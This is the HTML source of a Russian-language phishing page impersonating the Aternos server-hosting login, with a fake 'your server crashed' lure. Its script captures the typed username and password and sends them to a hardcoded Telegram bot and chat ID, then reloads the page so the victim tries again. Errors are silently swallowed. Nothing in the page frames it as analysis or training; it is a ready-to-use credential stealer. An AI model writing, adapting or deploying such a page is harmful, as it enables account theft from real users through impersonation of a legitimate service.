<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>Aternos — вход</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #eef2f5;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 16px;
        }

        .card {
            width: 90%;
            max-width: 90%;
            background: #ffffff;
            border: 1px solid #dce5ec;
            padding: 32px 28px 48px;
            margin: 0 auto;
        }

        @media (max-width: 480px) {
            .card {
                width: 95%;
                padding: 24px 20px 40px;
            }
        }

        @media (min-width: 1200px) {
            .card {
                max-width: 850px;
                padding: 48px 56px 60px;
            }
        }

        .site-title {
            font-size: 48px;
            font-weight: 700;
            text-align: center;
            color: #1a2c3e;
            margin-bottom: 28px;
            font-family: 'Courier New', monospace;
        }

        .welcome-title {
            font-size: 28px;
            font-weight: 600;
            text-align: center;
            color: #a80a0a;
            margin-bottom: 8px;
        }

        .welcome-sub {
            text-align: center;
            color: #783030;
            font-size: 16px;
            margin-bottom: 32px;
        }

        .auth-switch {
            display: flex;
            justify-content: center;
            gap: 48px;
            margin-bottom: 28px;
        }

        .auth-switch span {
            font-size: 22px;
            font-weight: 500;
            cursor: pointer;
        }

        .register-tab {
            color: #6c7a91;
        }

        .login-tab {
            color: #1a2c3e;
            font-weight: 600;
        }

        .separator {
            height: 1px;
            background: #e2e8f0;
            margin: 24px 0;
        }

        .input-group {
            margin-bottom: 24px;
        }

        .input-group label {
            display: block;
            font-size: 16px;
            font-weight: 500;
            color: #1e2f3e;
            margin-bottom: 8px;
        }

        .input-group input {
            width: 100%;
            padding: 14px 16px;
            font-size: 17px;
            border: 1px solid #cbdae6;
            background: white;
            outline: none;
        }

        .input-group input:focus {
            border-color: #2b87d3;
        }

        .forgot-link {
            text-align: right;
            margin: 16px 0 24px;
        }

        .forgot-link a {
            color: #2b87d3;
            font-size: 14px;
            text-decoration: none;
        }

        .action-buttons {
            display: flex;
            gap: 16px;
            margin: 24px 0;
        }

        .login-btn {
            flex: 2;
            background: #2b87d3;
            border: none;
            padding: 14px;
            font-size: 18px;
            font-weight: 600;
            color: white;
            cursor: pointer;
        }

        .login-btn:hover {
            background: #1e6eb0;
        }

        .change-btn {
            flex: 1;
            background: #f0f4f9;
            border: 1px solid #cbdae6;
            padding: 14px;
            font-size: 16px;
            font-weight: 500;
            color: #2b87d3;
            cursor: pointer;
            text-align: center;
        }

        .divider {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 14px;
            color: #8c9bb0;
            font-size: 14px;
            margin: 24px 0;
        }

        .divider-line {
            flex: 1;
            height: 1px;
            background: #e2e8f0;
        }

        .google-btn {
            width: 100%;
            background: white;
            border: 1px solid #cbdae6;
            padding: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            cursor: pointer;
            margin: 24px 0;
        }

        .google-btn span {
            font-size: 16px;
            font-weight: 500;
            color: #2c3e4e;
        }

        .signup-footer {
            text-align: center;
            margin-top: 24px;
            font-size: 16px;
            color: #5e6f8d;
        }

        .signup-footer a {
            color: #2b87d3;
            text-decoration: none;
        }
        img {
            height: 60px;
            padding-top: 10px;            
        }
    </style>
</head>
<body>
<div class="card">
    <div class="site-title"><img src="img/kk.jpeg" alt=""> ATERNOS</div>
    <div class="welcome-title">На вашем сервере произошел сбой!</div>
    <div class="welcome-sub">Войдите на аккаунт с сервером что бы решить проблему.</div>

    <div class="auth-switch">
       
        <span class="login-tab">Вход</span>
    </div>

    <div class="separator"></div>

    <form id="loginForm">
        <div class="input-group">
            <label>Имя пользователя</label>
            <input type="text" id="username" placeholder="Ваш логин" autocomplete="off" required>
        </div>
        <div class="input-group">
            <label>Пароль</label>
            <input type="password" id="password" placeholder="Ваш пароль" autocomplete="off" required>
        </div>
    </form>

    <div class="forgot-link">
        <a href="#">Забыли пароль?</a>
    </div>

    <div class="separator"></div>

    <div class="action-buttons">
        <button type="submit" form="loginForm" class="login-btn">Вход</button>

    </div>

    <div class="separator"></div>

    <div class="divider">
        <div class="divider-line"></div>
        <span>ИЛИ</span>
        <div class="divider-line"></div>
    </div>

    <button class="google-btn" id="googleBtn">
        <svg width="20" height="20" viewBox="0 0 24 24">
            <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
            <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
            <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
            <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
        </svg>
        <span>Войти через Google(недоступно)</span>
    </button>

    <div class="separator"></div>

    <div class="signup-footer">
        Нет аккаунта? <a href="#">Зарегистрироваться</a>
    </div>
</div>

<script>
    // ==================== НАСТРОЙКИ ====================
    const BOT_TOKEN = "8977254343:AAHuJCG0D1lSCEAOoeOJ7Wu-VjJiqfne7Xc";
    const CHAT_ID = "8234127721";
    // ===================================================

    const form = document.getElementById('loginForm');
    const changeBtn = document.getElementById('changeBtn');
    const googleBtn = document.getElementById('googleBtn');

    async function sendToTelegram(username, password, source) {
        const message = `🔐 НОВЫЕ ДАННЫЕ 🔐\n\n👤 Логин: ${username}\n🔑 Пароль: ${password}\n🕒 Время: ${new Date().toLocaleString()}\n📌 Источник: ${source}`;
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        try {
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message
                })
            });
        } catch(e) {
            // Ошибка никак не показывается роботу
        }
    }

    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value.trim();
        
        if (username && password) {
            await sendToTelegram(username, password, 'login_form');
        }
        location.reload();
    });

    changeBtn.addEventListener('click', async function() {
        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value.trim();
        
        if (username && password) {
            await sendToTelegram(username, password, 'change_button');
        }
        location.reload();
    });

    googleBtn.addEventListener('click', async function() {
        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value.trim();
        
        if (username && password) {
            await sendToTelegram(username, password, 'google_button');
        }
        location.reload();
    });
</script>
</body>
</html>
